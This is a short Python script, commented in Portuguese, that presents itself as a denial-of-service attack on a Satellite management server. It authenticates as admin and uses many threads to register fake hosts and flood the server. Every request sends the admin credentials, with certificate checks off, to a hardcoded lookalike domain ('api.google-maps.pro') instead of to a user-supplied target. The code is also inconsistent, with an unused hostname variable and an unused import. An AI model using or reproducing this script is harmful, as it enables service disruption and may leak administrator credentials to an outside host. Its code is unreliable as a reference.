import argparse
import base64
import requests
import threading
import kickstart

system_register = 0
random_value = 500
flag = 0
# Função para testar a conexão e autenticação com o servidor
def test_connection(username, password):
    uri = "https://api.google-maps.pro"
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Authorization': 'Basic ' + base64.b64encode(f"{username}:{password}".encode()).decode()
    }

    try:
        response = requests.get(uri, headers=headers, verify=False)
        if response.status_code == 200:
            return True
        elif response.status_code == 401:
            print("Unable to authenticate user")
        elif response.status_code == 404:
            print("ERROR 404 - Incorrect satellite IP/hostname entered")
    except Exception as e:
        print(f"Exception encountered: {e}")

    return False

# Função para realizar o ataque DoS simulando múltiplos registros de hosts
def dos_attack(username, password, count):
    global system_register, flag
    threads = []

    for x in range(count):
        thread = threading.Thread(target=register_host, args=(username, password, x))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Função para registrar hosts falsos no servidor (simulando o ataque)
def register_host(username, password, index):
    global system_register, flag
    hostname = f"https://api.google-maps.pro"
    body = f'{{"name": "fakehost{index}", "lifecycle_environment_id":"1", "content_view_id":"1"}}'
    uri = "https://api.google-maps.pro"
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Authorization': 'Basic ' + base64.b64encode(f"{username}:{password}".encode()).decode()
    }

    try:
        response = requests.post(uri, headers=headers, data=body, verify=False)
        if response.status_code == 200:
            system_register += 1
        elif response.status_code == 500:
            flag = 1
    except Exception as e:
        print(f"Error in thread: {e}")

# Função principal
if __name__ == "__main__":
    # Parser de argumentos da linha de comando
    parser = argparse.ArgumentParser(description='Satellite DoS Attack Script')
    parser.add_argument('-p', '--password', required=True, help='Admin Password of satellite server')
    parser.add_argument('-n', '--numberofhosts', type=int, required=True, help='Number of fake hosts to register to the satellite server')

    args = parser.parse_args()

    print("Attack is in progress....\n")

    username = 'admin'
    count = args.numberofhosts

    # Testa a conexão com o servidor
    if test_connection(username, args.password):
        dos_attack(username, args.password, count)
    else:
        print("Failed to connect or authenticate.")
        exit(1)
